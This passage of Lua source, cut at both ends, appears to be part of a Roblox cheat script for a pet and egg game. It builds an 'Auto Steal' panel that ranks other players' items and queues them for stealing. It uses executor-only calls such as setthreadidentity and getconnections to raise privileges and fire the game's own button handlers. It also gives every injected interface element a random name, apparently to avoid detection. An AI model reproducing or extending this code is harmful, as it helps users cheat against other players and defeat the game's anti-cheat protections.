		local tbl13 = { 0.58, color2(42, 46, 56) }
		local tbl14 = { 0.78, color2(158, 166, 182) }
		local tbl15 = { 1, color2(250, 252, 255) }
		tbl9[1] = tbl10
		tbl9[2] = tbl11
		tbl9[3] = tbl12
		tbl9[4] = tbl13
		tbl9[5] = tbl14
		tbl9[6] = tbl15
		local v9 = fn8(tbl9)
		local tbl16 = {}
		local rarityGradients = nil

		fn9 = function(arg)
			local v10 = tbl16[arg]
			if v10 then
				return v10
			end
			local directory = tbl.Assets and tbl.Assets.Directory
			local flag = type(directory) == "table" and directory[arg] or nil
			local rarity = type(flag) == "table" and type(flag.Rarity) == "table" and flag.Rarity or nil
			local rarityGradient = rarity and rarity.RarityGradient or nil

			if rarity and typeof(rarityGradient) ~= "Instance" then
				if rarityGradients == nil then
					local assets = ReplicatedStorage:FindFirstChild("Assets")
					assets = assets and assets:FindFirstChild("UI")
					rarityGradients = assets and assets:FindFirstChild("RarityGradients") or false
				end

				rarityGradient = rarityGradients

				if rarityGradients then
					rarityGradient = rarityGradients:FindFirstChild(tostring(rarity._id or rarity.DisplayName or ""))
				end

				rarityGradient = rarityGradient and rarityGradient:FindFirstChild("RarityGradient") or nil
			end

			local str

			if rarity then
				str = tostring(rarity.DisplayName or rarity._id or "")
			else
				str = rarity
			end

			str = str or ""
			local color3 = rarity and typeof(rarity.Color) == "Color3" and rarity.Color or color2(255, 255, 255)
			local color4 = fn8({ { 0, color3 }, { 1, color3 } })
			local gradientRotation

			if string.upper(str) == "SECRET" then
				color4 = v9
				gradientRotation = 90
			else
				local isUIGradient = typeof(rarityGradient) == "Instance" and rarityGradient:IsA("UIGradient")
				gradientRotation = 90

				if isUIGradient then
					color4 = rarityGradient.Color
					gradientRotation = rarityGradient.Rotation
				end
			end

			local icon = type(flag) == "table" and flag.Icon or nil

			if tonumber(icon) then
				icon = "rbxassetid://" .. tostring(icon)
			end

			local tbl17 = {}
			local name = type(flag) == "table"

			if name then
				name = tostring(flag.DisplayName or arg)
			end

			tbl17.Name = name or tostring(arg)
			tbl17.Icon = icon and tostring(icon) or ""

			if rarity then
				rarity = tonumber(rarity.RarityNumber or rarity.Rank)
			end

			tbl17.RarityNumber = rarity or 0
			tbl17.GradientColor = color4
			tbl17.GradientRotation = gradientRotation
			tbl17.EarningRate = type(flag) == "table" and tonumber(flag.EarningRate) or 0
			tbl16[arg] = tbl17
			return tbl17
		end
	end

	local fn10

	fn10 = function(arg, arg2)
		local n12 = tonumber(arg.AssetScale) or 1
		local n13 = n12 > 5 and (n12 / 5) ^ 1.2 * 19.637875755794113 or n12 ^ 1.85
		local mutations = type(arg.Mutations) == "table" and arg.Mutations or {}

		if #mutations == 0 and type(arg.BaseMutation) == "string" and arg.BaseMutation ~= "" then
			mutations = { arg.BaseMutation }
		end

		local mutations2 = tbl.Mutations
		local flag = type(mutations2) == "table" and type(mutations2.EarningsFor) == "function"
		local n14 = 1

		if flag then
			local ok, result = pcall(mutations2.EarningsFor, mutations)

			if ok and type(result) == "number" then
				n14 = result
			end
		end

		return arg2.EarningRate * n13 * n14
	end

	local fn11
	local tbl9 = { "", "K", "M", "B", "T", "Qa", "Qi", "Sx" }

	fn11 = function(arg)
		local n12 = tonumber(arg) or 0
		local n13 = 1

		while n12 >= 1000 and n13 < #tbl9 do
			n12 /= 1000
			n13 += 1
		end

		local str = n13 == 1 and tostring(math.floor(n12)) or string.format("%.1f", math.floor(n12 * 10) / 10)
		local str2 = tbl9[n13] .. "/s"
		return "$" .. string.gsub(str, "%.0$", "") .. str2
	end

	local fn12

	fn12 = function(arg, text)
		if arg and arg.Text ~= text then
			arg.Text = text
		end
	end

	local flag
	flag = false
	local n12
	n12 = 0
	local flag2
	flag2 = false
	local v9
	v9 = nil
	local v10
	v10 = nil
	local v11
	v11 = nil
	local imageLabel
	imageLabel = nil
	local v12
	v12 = nil
	local v13
	v13 = nil
	local position
	position = nil
	local title
	title = nil
	local v14
	v14 = nil
	local v15
	v15 = nil
	local v16
	v16 = nil
	local flag3
	flag3 = false
	local v17
	v17 = v2:CreateState({ Name = "Steal Panel Open", Default = true })
	local flag4
	flag4 = false
	local tween
	tween = nil
	local tween2
	tween2 = nil
	local n13
	n13 = 0
	local tbl10
	tbl10 = nil
	local tbl11
	tbl11 = nil
	local n14
	n14 = 1
	local tbl12
	tbl12 = {}
	local tbl13
	tbl13 = {}
	local n15
	n15 = 1
	local tbl14
	tbl14 = {}
	local uiStroke, thickness, flag5, flag6, flag7, fn13, fn14, fn15, fn16, tbl15
	local fn17, fn18

	do
		local obj = setmetatable({}, { __mode = "k" })
		uiStroke = nil
		thickness = nil
		flag5 = false
		flag6 = false
		flag7 = false
		fn13 = nil

		fn14 = function()
			local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
			local hud = playerGui and playerGui:FindFirstChild("HUD")
			local gameHUD = hud and hud:FindFirstChild("GameHUD")
			local rightButtons = gameHUD and gameHUD:FindFirstChild("RightButtons")
			local activePets = playerGui and playerGui:FindFirstChild("ActivePets")

			local tbl16 = {
				Hud = hud,
				GameHud = gameHUD,
				Column = rightButtons,
				Eggs = rightButtons and rightButtons:FindFirstChild("EggsButton"),
				Pets = rightButtons and rightButtons:FindFirstChild("PetsButton"),
				ActivePets = activePets,
				GrowingEggs = playerGui and playerGui:FindFirstChild("GrowingEggs"),
			}

			if not (hud and gameHUD and rightButtons and tbl16.Eggs and tbl16.Pets and activePets and activePets:FindFirstChild("Frame")) then
				return nil
			end
			return tbl16
		end

		fn15 = function(arg)
			local ok, result = pcall(function()
				return arg:Clone()
			end)

			if not ok or typeof(result) ~= "Instance" then
				return nil
			end

			for _, descendant in ipairs(result:GetDescendants()) do
				if descendant:IsA("LuaSourceContainer") then
					descendant:Destroy()
				end
			end

			return result
		end

		fn16 = function(arg)
			arg.Name = fn3()

			for _, descendant in ipairs(arg:GetDescendants()) do
				descendant.Name = fn3()
			end
		end

		local n16 = 2.3120369911193848
		local n17 = 556
		local n18 = 86.24
		tbl15 = { Panel = n16, Hud = n16 }

		local function fn19(arg)
			if arg then
				local x = v13 and v13.AbsoluteSize.X or 0
				return x > 0 and n16 * x / n17 or nil
			end
			local button = v11 and v11.Button
			button = button and button.Size.X.Offset or 0
			return button > 0 and n16 * button / n18 or nil
		end

		local function fn20(arg, arg2)
			local v18 = fn19(arg2.Panel)

			if v18 and arg.Parent then
				arg.Thickness = arg2.Ratio * v18
			end
		end

		fn17 = function(arg, arg2)
			local panel = arg2 and tbl15.Panel or tbl15.Hud

			if not panel or panel <= 0 then
				panel = 2.3120369911193848
			end

			for _, descendant in ipairs(arg:GetDescendants()) do
				if descendant:IsA("UIStroke") then
					local ok, result = pcall(function()
						return descendant.StrokeSizingMode
					end)

					if not ok or result ~= Enum.StrokeSizingMode.ScaledSize then
						local tbl16 = { Ratio = descendant.Thickness / panel, Panel = arg2 == true }
						obj[descendant] = tbl16
						fn20(descendant, tbl16)
					end
				end
			end
		end

		fn18 = function()
			for k, v18 in pairs(obj) do
				fn20(k, v18)
			end
		end
	end

	local fn19

	fn19 = function()
		fn18()
	end

	local fn20

	fn20 = function(arg)
		if not arg then
			return nil
		end

		return {
			Button = arg,
			Gradient = arg:FindFirstChildOfClass("UIGradient"),
			Stroke = arg:FindFirstChild("UIStroke"),
			Light = arg:FindFirstChild("UIStrokeClr"),
			Label = arg:FindFirstChild("Label") or arg:FindFirstChild("TextLabel"),
			Scale = arg:FindFirstChild("BtnScale"),
		}
	end

	local fn21

	fn21 = function(arg, style)
		if not arg or arg.Style == style then
			return
		end
		arg.Style = style

		if arg.Gradient then
			arg.Gradient.Color = style.Color
			arg.Gradient.Rotation = style.Rotation
		end

		if arg.Stroke then
			arg.Stroke.Color = style.Stroke
		end

		if arg.Light then
			arg.Light.Color = style.Light
		end
	end

	local fn22

	fn22 = function(arg)
		if not arg then
			return
		end
		local scale = arg.Scale

		if not scale then
			scale = Instance.new("UIScale")
			scale.Parent = arg.Button
			arg.Scale = scale
		end

		local function fn23(arg2)
			TweenService:Create(scale, tweenInfo5, { Scale = arg2 }):Play()
		end

		arg.Button.MouseEnter:Connect(function()
			fn23(1.08)
		end)

		arg.Button.MouseLeave:Connect(function()
			fn23(1)
		end)

		arg.Button.MouseButton1Down:Connect(function()
			fn23(0.94)
		end)

		arg.Button.MouseButton1Up:Connect(function()
			fn23(1.08)
		end)
	end

	local fn23

	do
		local tweenInfo6 = TweenInfo.new(2.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
		local tweenInfo7 = TweenInfo.new(6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
		local tweenInfo8 = TweenInfo.new(1.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
		local tbl16 = {}

		fn23 = function(arg)
			for _, v18 in ipairs(tbl16) do
				pcall(function()
					v18:Cancel()
				end)
			end

			table.clear(tbl16)
			if not arg then
				return
			end

			local function fn24(arg2)
				tbl16[#tbl16 + 1] = arg2
				arg2:Play()
			end

			local gradient = arg.Gradient

			if gradient then
				gradient.Rotation = -115
				gradient.Offset = Vector2.new(-0.30000001192092896, 0)
				fn24(TweenService:Create(gradient, tweenInfo6, { Offset = Vector2.new(0.30000001192092896, 0) }))
				fn24(TweenService:Create(gradient, tweenInfo7, { Rotation = -65 }))
			end

			local light = arg.Light

			if light then
				light.Color = color2(226, 178, 255)
				fn24(TweenService:Create(light, tweenInfo8, { Color = color2(255, 245, 255) }))
			end
		end
	end

	do
		local v18 = setthreadidentity or set_thread_identity

		local function fn24()
			local eggState = tbl.EggState

			if type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function" then
				local records = nil

				task.spawn(function()
					local ok, result = pcall(eggState.ReadFieldEggs)

					if ok and type(result) == "table" and type(result.Records) == "table" and next(result.Records) ~= nil then
						records = result.Records
					end
				end)

				if type(v18) == "function" then
					pcall(v18, 8)
				end

				if records then
					return records
				end
			end

			local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
			if not rfEggWorldAskFieldEggSnapshot or not rfEggWorldAskFieldEggSnapshot:IsA("RemoteFunction") then
				return nil
			end
			local flag8 = false
			local records = nil

			task.spawn(function()
				local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)

				if ok and type(result) == "table" and type(result.Records) == "table" then
					records = result.Records
				end

				flag8 = true
			end)

			local now = os.clock()

			while not flag8 and os.clock() - now < n5 do
				RunService.Heartbeat:Wait()
			end

			return records
		end

		local function fn25()
			return v9 ~= nil and (v9.ActivePets and v9.ActivePets.Enabled or v9.GrowingEggs and v9.GrowingEggs.Enabled) or false
		end

		local function fn26()
			local flag8 = false

			for _, v19 in ipairs({ v9.ActivePets, v9.GrowingEggs }) do
				if v19 and v19.Enabled then
					local frame = v19:FindFirstChild("Frame")
					frame = frame and frame:FindFirstChild("Close")
					local flag9 = frame and typeof(getconnections) == "function"
					local flag10 = false

					if flag9 then
						local ok, result = pcall(getconnections, frame.Activated)

						if ok and type(result) == "table" then
							for _, v20 in ipairs(result) do
								if pcall(function()
									v20:Fire()
								end) then
									flag10 = true
								end
							end
						end
					end

					if not flag10 then
						v19.Enabled = false
					end

					flag8 = true
				end
			end

			return flag8
		end

		local function fn27(arg, arg2)
			local column = v9 and v9.Column
			if not column or not column.Parent then
				return
			end

			if tween2 then
				tween2:Cancel()
				tween2 = nil
			end

			local position2 = column.Position
			local udim2 = UDim2.new(position2.X.Scale, arg and math.ceil(column.AbsoluteSize.X * n11) or 0, position2.Y.Scale, position2.Y.Offset)
			if arg2 then
				column.Position = udim2
				return
			end
			tween2 = TweenService:Create(column, arg and tweenInfo3 or tweenInfo4, { Position = udim2 })
			tween2:Play()
		end

		local n16 = 0.106
		local udim2 = UDim2.new(0.955, 0, 0.6, 0)
		local udim22 = UDim2.new(0.955 - n16, 0, 0.6, 0)
		local udim23 = UDim2.new(0.2, 0, 0.56, 0)
		local n17 = 0.955 - n16

		local function fn28(arg, visible)
			if arg and arg.Button.Visible ~= visible then
				arg.Button.Visible = visible
			end
		end

		local function fn29(arg, rank, arg2, arg3)
			local visible = rank ~= nil
			arg.Rank = rank
			fn28(arg.Steal, not visible)
			fn28(arg.Up, visible)
			fn28(arg.Down, visible)
			fn28(arg.Cancel, visible)

			if visible then
				fn21(arg.Up, rank > 1 and tbl8.Hud or tbl8.Queued)
				fn21(arg.Down, rank < (arg3 or rank) and tbl8.Hud or tbl8.Queued)
			end

			fn21(arg.Star, rank == 1 and tbl8.PriorityOn or tbl8.Queued)

			if arg.Badge then
				if arg.Badge.Visible ~= visible then
					arg.Badge.Visible = visible
				end

				if visible then
					fn12(arg.Badge, "#" .. rank)
					local steal = arg2 and tbl8.Steal or tbl8.PriorityOn

					if arg.BadgeStyle ~= steal and arg.BadgeGradient then
						arg.BadgeStyle = steal
						arg.BadgeGradient.Color = steal.Color
						arg.BadgeGradient.Rotation = 90
					end
				end
			end
		end

		local function fn30()
			if not tbl10 then
				return
			end
			local v19 = tbl4.Toggle(v4, false)

			if tbl10.On ~= v19 then
				tbl10.On = v19
				fn21(tbl10.Toggle, v19 and tbl8.Steal or tbl8.Cancel)
				fn12(tbl10.Toggle.Label, v19 and "Auto Steal: ON" or "Auto Steal: OFF")
			end

			local dragValue = tbl10.Dragging and tbl10.DragValue

			if not dragValue then
				dragValue = math.clamp(math.floor((tonumber(n2) or 400) + 0.5), 100, 1000)
			end

			if tbl10.Speed ~= dragValue then
				tbl10.Speed = dragValue
				tbl10.Fill.Size = UDim2.new((dragValue - 100) / 900, 0, 1, 0)
				fn12(tbl10.Text, "Tween Speed: " .. dragValue)
			end
		end

		local n18 = 4
		local tbl16 = {}
		local tbl17 = {}

		local function fn31()
			if not v15 then
				return
			end
			fn30()
			local tbl18 = {}

			for _, v19 in pairs(tbl13) do
				table.insert(tbl18, v19)
			end

			local tbl19 = {}
			local v19 = nil

			if type(tbl4.StealPlan) == "function" then
				task.spawn(function()
					local ok, result, result2 = pcall(tbl4.StealPlan)

					if ok and type(result) == "table" then
						tbl19 = result
						v19 = result2
					end
				end)
			end

			local tbl20 = {}

			for i, v20 in ipairs(tbl19) do
				if tbl20[v20] == nil then
					tbl20[v20] = i
				end
			end

			local v20 = tbl7[n15]
			local v21 = tbl4.Root()

			local function fn32(arg)
				if not v21 or not arg.Position then
					return math.huge
				end
				return (v21.Position - arg.Position).Magnitude
			end

			table.sort(tbl18, function(arg, arg2)
				local v22 = tbl20[arg.Uid]
				local v23 = tbl20[arg2.Uid]
				if v22 ~= nil ~= v23 ~= nil then
					return v22 ~= nil
				end

				if v22 and v23 then
					return v22 < v23
				end

				if v20 == "Rarity" and arg.Style.RarityNumber ~= arg2.Style.RarityNumber then
					return arg.Style.RarityNumber > arg2.Style.RarityNumber
				end
				local flag8 = v20 == "Weight"

				if flag8 then
					flag8 = (arg.Weight or 0) ~= (arg2.Weight or 0)
				end

				if flag8 then
					return (arg.Weight or 0) > (arg2.Weight or 0)
				end

				if v20 == "Distance" then
					local v24 = fn32(arg)
					local v25 = fn32(arg2)
					if v24 ~= v25 then
						return v24 < v25
					end
				end

				if arg.Value ~= arg2.Value then
					return arg.Value > arg2.Value
				end
				return arg.Uid < arg2.Uid
			end)

			local now = os.clock()
			local tbl21 = {}
			local tbl22 = {}

			for _, v22 in ipairs(tbl18) do
				local v23 = tbl16[v22.Uid]

				if v23 and v23 > now and tbl17[v22.Uid] then
					table.insert(tbl22, v22)
				else
					tbl16[v22.Uid] = nil
					table.insert(tbl21, v22)
				end
			end

			table.sort(tbl22, function(arg, arg2)
				return tbl17[arg.Uid] < tbl17[arg2.Uid]
			end)

			for _, v22 in ipairs(tbl22) do
				table.insert(tbl21, math.clamp(tbl17[v22.Uid], 1, #tbl21 + 1), v22)
			end

			table.clear(tbl17)

			for i, v22 in ipairs(tbl21) do
				tbl17[v22.Uid] = i
				local v23 = tbl12[v22.Uid]

				if v23 then
					if v23.Frame.LayoutOrder ~= i then
						v23.Frame.LayoutOrder = i
					end

					fn29(v23, tbl20[v22.Uid], v22.Uid == v19, #tbl19)
				end
			end
		end

		local function fn32()
			if not v15 then
				return
			end
			local n19 = math.max(1, math.floor(v15.AbsoluteSize.X / n9 + 0.5))
			if n19 == n13 then
				return
			end
			n13 = n19

			for _, v19 in pairs(tbl12) do
				v19.Frame.Size = UDim2.new(1, 0, 0, n19)
			end
		end

		local function fn33(arg)
			local clone = v16:Clone()
			local spacer = clone:FindFirstChild("Spacer")
			local textLabel = spacer:FindFirstChild("TextLabel")

			local tbl18 = {
				Uid = arg,
				Frame = clone,
				Icon = spacer:FindFirstChild("Icon"),
				Label = textLabel,
				ValueLabel = spacer:FindFirstChild("Value"),
				DetailLabel = spacer:FindFirstChild("Detail"),
			}

			tbl18.Gradient = textLabel and textLabel:FindFirstChildOfClass("UIGradient")
			tbl18.Steal = fn20(spacer:FindFirstChild("Unequip"))
			tbl18.Cancel = fn20(spacer:FindFirstChild("Cancel"))
			tbl18.Star = fn20(spacer:FindFirstChild("Star"))
			tbl18.Up = fn20(spacer:FindFirstChild("Up"))
			tbl18.Down = fn20(spacer:FindFirstChild("Down"))
			tbl18.Badge = spacer:FindFirstChild("Rank")
			tbl18.BadgeGradient = tbl18.Badge and tbl18.Badge:FindFirstChildOfClass("UIGradient") or nil

			if textLabel and not tbl18.Gradient then
				tbl18.Gradient = Instance.new("UIGradient")
				tbl18.Gradient.Parent = textLabel
			end

			fn22(tbl18.Steal)
			fn22(tbl18.Cancel)
			fn22(tbl18.Star)
			fn22(tbl18.Up)
			fn22(tbl18.Down)

			for _, v19 in ipairs({ { tbl18.Up, -1 }, { tbl18.Down, 1 } }) do
				if v19[1] then
					v19[1].Button.Activated:Connect(function()
						if type(tbl4.MoveInPlan) == "function" then
							tbl4.MoveInPlan(tbl18.Uid, v19[2])
						end

						fn31()
					end)
				end
			end

			if tbl18.Steal then
				tbl18.Steal.Button.Activated:Connect(function()
					if tbl18.Rank == nil and type(tbl4.StealNow) == "function" then
						tbl4.StealNow(tbl18.Uid, false)
					end

					fn31()
				end)
			end

			if tbl18.Cancel then
				tbl18.Cancel.Button.Activated:Connect(function()
					tbl16[tbl18.Uid] = os.clock() + n18

					if type(tbl4.CancelSteal) == "function" then
						tbl4.CancelSteal(tbl18.Uid)
					end

					fn31()
				end)
			end

			if tbl18.Star then
				tbl18.Star.Button.Activated:Connect(function()
					if type(tbl4.PrioritizeSteal) == "function" then
						tbl4.PrioritizeSteal(tbl18.Uid)
					end

					fn31()
				end)
			end

			fn17(clone, true)
			fn16(clone)
			clone.Size = UDim2.new(1, 0, 0, math.max(n13, 1))
			clone.Visible = true
			clone.Parent = v15
			return tbl18
		end

		local function fn34(arg, arg2)
			local style = arg2.Style

			if arg.Category ~= arg2.Category then
				arg.Category = arg2.Category

				if arg.Icon then
					arg.Icon.Image = style.Icon
				end

				if arg.Gradient then
					arg.Gradient.Color = style.GradientColor
					arg.Gradient.Rotation = style.GradientRotation
				end
			end

			fn12(arg.Label, style.Name)
			fn12(arg.ValueLabel, fn11(arg2.Value))
			fn12(arg.DetailLabel, arg2.Detail or "")
		end

		local function fn35(arg)
			local n19 = tonumber(arg) or 0
			local str = n19 >= 1000 and string.format("%.0f", n19) or string.format("%.2f", n19)
			local v19, v20 = string.match(str, "^(%-?%d+)(%.%d+)$")
			local v21 = v19 or str
			local v22

			while true do
				local v23
				v22, v23 = string.gsub(v21, "^(%-?%d+)(%d%d%d)", "%1,%2")

				if v23 ~= 0 then
					v21 = v22
				else
					break
				end
			end

			return v22 .. (v20 or "") .. " Kg"
		end

		local function fn36(arg, arg2)
			local str = string.format("x%.2f", arg2)
			local eggRecords = tbl.EggRecords
			local flag8 = type(eggRecords) == "table" and type(eggRecords.WeightKgForScale) == "function"
			local n19 = 0

			if flag8 then
				local ok, result = pcall(eggRecords.WeightKgForScale, arg, arg2)

				if ok and tonumber(result) then
					n19 = tonumber(result)
					str ..= "  " .. utf8.char(183) .. "  " .. fn35(result)
				end
			end

			return str, n19
		end

		local fn37 = nil

		local function fn38(arg)
			local v19 = fn24()

			if v19 and arg == n12 and flag then
				local tbl18 = {}
				local now = os.clock()
				local n19 = -1
				local v20 = nil

				for _, v21 in pairs(v19) do
					local uid = type(v21) == "table" and v21.Uid or nil
					local flag8 = v21.State == "Slot" or v21.State == "Dropped" or v21.State == "Carried"

					if type(uid) == "string" and flag8 and type(v21.AssetCategory) == "string" then
						tbl18[uid] = true
						local v22 = fn9(v21.AssetCategory)
						local tbl19 = tbl13[uid]

						if not tbl19 then
							tbl19 = { Uid = uid }
							tbl13[uid] = tbl19
						end

						local scale = tonumber(v21.AssetScale) or 1

						if tbl19.Detail == nil or tbl19.Scale ~= scale or tbl19.Category ~= v21.AssetCategory then
							tbl19.Scale = scale
							local v23, v24 = fn36(v21.AssetCategory, scale)
							tbl19.Detail = v23
							tbl19.Weight = v24
						end

						tbl19.Category = v21.AssetCategory
						tbl19.Style = v22
						tbl19.Value = fn10(v21, v22)
						tbl19.Position = typeof(v21.BottomCFrame) == "CFrame" and v21.BottomCFrame.Position or nil

						if (v21.State == "Slot" or v21.State == "Dropped") and v22.Icon ~= "" and tbl19.Value > n19 then
							n19 = tbl19.Value
							v20 = tbl19
						end

						if flag3 and v15 then
							local v23 = tbl12[uid]

							if not v23 then
								v23 = fn33(uid)
								tbl12[uid] = v23
							end

							fn34(v23, tbl19)
						end
					end

					if os.clock() - now > n4 then
						RunService.Heartbeat:Wait()
						now = os.clock()
						if arg ~= n12 or not flag then
							return
						end
					end
				end

				for k in pairs(tbl13) do
					if not tbl18[k] then
						tbl13[k] = nil
						local v21 = tbl12[k]

						if v21 then
							tbl12[k] = nil
							v21.Frame:Destroy()
						end
					end
				end

				if imageLabel and v20 and imageLabel.Image ~= v20.Style.Icon then
					imageLabel.Image = v20.Style.Icon
				end

				fn31()
			end
		end

		local n19 = 0

		local function fn39(arg)
			if flag6 and os.clock() - n19 < 10 then
				flag7 = true
				return
			end
			flag6 = true
			n19 = os.clock()
			pcall(fn38, arg)

			if n19 == n19 then
				flag6 = false
			end

			if flag7 then
				flag7 = false
				fn37()
			end
		end

		fn37 = function()
			if flag5 or not flag then
				return
			end
			flag5 = true
			local v19 = n12

			task.delay(flag3 and 0.15 or 1, function()
				flag5 = false

				if flag and v19 == n12 then
					task.spawn(pcall, fn39, v19)
				end
			end)
		end

		local function fn40(arg)
			if flag3 or not v13 then
				return
			end
			flag3 = true

			if arg then
				v17:Set(true)
			end

			if fn26() then
				RunService.Heartbeat:Wait()
				if not flag3 or not v13 then
					return
				end
			end

			fn27(true)
			v12.Enabled = true

			if tween then
				tween:Cancel()
			end

			local scale = position.Y.Scale
			local offset = position.Y.Offset
			v13.Position = UDim2.new(position.X.Scale, math.ceil(v13.AbsoluteSize.X * n10), scale, offset)
			tween = TweenService:Create(v13, tweenInfo, { Position = position })
			tween:Play()
			fn19()
			fn32()
			task.spawn(pcall, fn39, n12)
		end

		local function fn41(arg, arg2)
			if not flag3 or not v13 then
				return
			end
			flag3 = false

			if arg2 then
				v17:Set(false)
			end

			if tween then
				tween:Cancel()
			end

			local scale = position.Y.Scale
			local offset = position.Y.Offset
			local tween3 = TweenService:Create(v13, tweenInfo2, { Position = UDim2.new(position.X.Scale, math.ceil(v13.AbsoluteSize.X * n10), scale, offset) })
			tween = tween3

			tween3.Completed:Connect(function(playbackState)
				if playbackState == Enum.PlaybackState.Completed and tween == tween3 and not flag3 and v12 then
					v12.Enabled = false
					v13.Position = position
				end
			end)

			tween3:Play()

			if arg then
				fn27(false)
			end
		end

		local function createScreenGui(arg)
			local screenGui = Instance.new("ScreenGui")
			screenGui.Name = fn3()
			screenGui.Archivable = false
			screenGui.ResetOnSpawn = false
			screenGui.IgnoreGuiInset = arg.IgnoreGuiInset
			screenGui.ZIndexBehavior = arg.ZIndexBehavior
			screenGui.DisplayOrder = arg.DisplayOrder

			pcall(function()
				screenGui.ScreenInsets = arg.ScreenInsets
			end)

			return screenGui
		end

		local function fn42()
			if v10 and v10.Parent and v11 and v11.Button then
				return true
			end
			local v19 = fn15(v9.Pets)
			if not v19 then
				return false
			end

			for _, v20 in ipairs({ "Notification", "ReadyNotification", "NightImage", "NightText", "ConsoleButton", "Badge" }) do
				local v21 = v19:FindFirstChild(v20)

				if v21 then
					v21:Destroy()
				end
			end

			v11 = fn20(v19)
			imageLabel = v19:FindFirstChild("ImageLabel")

			if v11.Scale then
				v11.Scale.Scale = 1
			end

			fn21(v11, tbl8.Chilli)
			fn22(v11)
			fn23(v11)
			v19.AnchorPoint = Vector2.new(0.5, 0.5)
			v19.LayoutOrder = 0

			v19.Activated:Connect(function()
				if not v12 or not v12.Parent then
					task.spawn(function()
						pcall(fn13)
						task.wait(0.15)

						if v12 and not flag3 then
							pcall(fn40, true)
						end
					end)

					return
				end

				if flag3 then
					fn41(true, true)
				else
					task.spawn(fn40, true)
				end
			end)

			fn17(v19)
			fn16(v19)
			v10 = createScreenGui(v9.Hud)
			v19.Parent = v10
			v10.Parent = v3
			return true
		end

		local v19 = nil
		local v20 = nil

		local function fn43()
			local button = v11 and v11.Button
			local eggs = v9.Eggs
			local pets = v9.Pets
			if not button or not eggs.Parent or not pets.Parent then
				return
			end

			if v9.Hud.Enabled and v9.GameHud.Visible and v9.Column.Visible and eggs.Visible and pets.Visible and eggs.AbsoluteSize.X > 0 then
				local uiScale = eggs:FindFirstChildOfClass("UIScale")
				uiScale = uiScale and uiScale.Scale or 1

				if uiScale <= 0 then
					uiScale = 1
				end

				local n20 = eggs.AbsolutePosition + eggs.AbsoluteSize / 2
				local n21 = eggs.AbsoluteSize / uiScale
				local absolutePosition = v10.AbsolutePosition
				local udim24 = UDim2.fromOffset(n20.X - absolutePosition.X, n20.Y - (pets.AbsolutePosition + pets.AbsoluteSize / 2).Y - n20.Y - absolutePosition.Y)
				local udim25 = UDim2.fromOffset(n21.X, n21.Y)

				if not flag3 then
					v19 = udim24
					v20 = udim25
				end

				if button.Position ~= udim24 then
					button.Position = udim24
				end

				if button.Size ~= udim25 then
					button.Size = udim25
					fn18()
				end
			elseif not flag3 and v19 then
				if button.Position ~= v19 then
					button.Position = v19
				end

				if v20 and button.Size ~= v20 then
					button.Size = v20
					fn18()
				end
			end

			if button.Visible ~= true then
				button.Visible = true
			end
		end

		local function fn44()
			local frame = v9.ActivePets.Frame
			local v21 = fn15(frame)
			if not v21 then
				return false
			end
			local header = v21:FindFirstChild("Header")
			local scrollingFrame = v21:FindFirstChild("ScrollingFrame")
			local close = v21:FindFirstChild("Close")
			local template = scrollingFrame and scrollingFrame:FindFirstChild("Template")
			local spacer = template and template:FindFirstChild("Spacer")
			local unequip = spacer and spacer:FindFirstChild("Unequip")
			local textLabel = spacer and spacer:FindFirstChild("TextLabel")
			if not (header and scrollingFrame and close and spacer and unequip and textLabel) then
				v21:Destroy()
				return false
			end

			for _, child in ipairs(scrollingFrame:GetChildren()) do
				if child ~= template and child:IsA("GuiObject") and child.Name ~= "EmptyLast" then
					child:Destroy()
				end
			end

			local equipBest = v21:FindFirstChild("EquipBest")

			if equipBest then
				equipBest:Destroy()
			end

			local uiAspectRatioConstraint = v21:FindFirstChildOfClass("UIAspectRatioConstraint")
			local aspectRatio = uiAspectRatioConstraint and uiAspectRatioConstraint.AspectRatio or 1.25
			local flag8 = not UserInputService.MouseEnabled
			local n20 = flag8 and 1.2 or 1
			local n21 = flag8 and 1.15 or 1
			local aspectRatio2 = n8 / n21
			local n22 = aspectRatio2 / aspectRatio
			tbl11 = { Width = frame.Size.X.Scale, Height = frame.Size.Y.Scale, Aspect = aspectRatio }
			v21.Size = UDim2.new(n6 * n20, 0, n7 * n20 * n21, 0)

			if not uiAspectRatioConstraint then
				uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
				uiAspectRatioConstraint.Parent = v21
			end

			uiAspectRatioConstraint.AspectRatio = aspectRatio2
			uiAspectRatioConstraint.AspectType = Enum.AspectType.FitWithinMaxSize
			header.Size = UDim2.new(header.Size.X.Scale, header.Size.X.Offset, header.Size.Y.Scale * n22, header.Size.Y.Offset)
			header.Position = UDim2.new(header.Position.X.Scale, header.Position.X.Offset, header.Position.Y.Scale * n22, header.Position.Y.Offset)
			close.Size = UDim2.new(close.Size.X.Scale * 1, close.Size.X.Offset, close.Size.Y.Scale * n22, close.Size.Y.Offset)
			close.Position = UDim2.new(close.Position.X.Scale * 1, close.Position.X.Offset, close.Position.Y.Scale, close.Position.Y.Offset)
			local scale = scrollingFrame.Size.Y.Scale
			local scale2 = scrollingFrame.Position.Y.Scale
			local y = scrollingFrame.AnchorPoint.Y
			local n23 = (scale2 - scale * y) * n22
			local n24 = 1 - (1 - scale2 + scale * (1 - y)) * n22
			scrollingFrame.Size = UDim2.new(scrollingFrame.Size.X.Scale, scrollingFrame.Size.X.Offset, n24 - n23, 0)
			scrollingFrame.Position = UDim2.new(scrollingFrame.Position.X.Scale, scrollingFrame.Position.X.Offset, n23 + (n24 - n23) * y, 0)
			local scale3 = scrollingFrame.Size.Y.Scale
			local y2 = scrollingFrame.AnchorPoint.Y
			local n25 = scrollingFrame.Position.Y.Scale - scale3 * y2
			local n26 = n25 + scale3
			local n27 = 0.1 * n22
			local n28 = 0.02 * n22
			local frame2 = Instance.new("Frame")
			frame2.BackgroundTransparency = 1
			frame2.BorderSizePixel = 0
			frame2.AnchorPoint = Vector2.new(0.5, 0)
			frame2.Position = UDim2.new(0.5, 0, n25 + n28, 0)
			frame2.Size = UDim2.new(0.9, 0, n27, 0)
			frame2.Parent = v21
			local n29 = n25 + n28 * 1.5 + n27
